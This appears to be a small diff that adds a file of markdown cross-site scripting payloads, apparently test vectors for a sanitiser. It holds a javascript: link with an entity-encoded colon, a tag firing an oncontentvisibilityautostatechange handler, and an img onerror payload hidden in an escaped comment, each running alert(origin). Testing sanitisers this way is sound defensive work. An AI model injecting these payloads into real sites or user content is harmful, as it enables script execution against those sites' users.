@@ -1,0 +1,5 @@
+[Click me](javascript&#58alert(origin))
+
+<http:|><x| oncontentvisibilityautostatechange=alert(origin) style=display:block;content-visibility:auto>
+
+\<!--<img src onerror=alert(origin)//>-->
